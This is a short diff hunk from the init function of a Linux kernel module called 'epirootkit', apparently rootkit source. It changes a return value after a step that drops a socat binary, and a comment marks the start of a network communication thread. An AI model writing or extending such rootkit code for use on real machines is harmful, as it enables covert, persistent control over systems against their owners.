@@ -80,7 +80,7 @@ static int __init epirootkit_init(void)
 
 	if(drop_socat_binaire() != SUCCESS) {
 		pr_err("epirootkit: epirootkit_init: failed to drop socat binary\n");
-		return FAILURE;
+		return -FAILURE;
 	}
 
 	// Start a kernel thread that will handle network communication
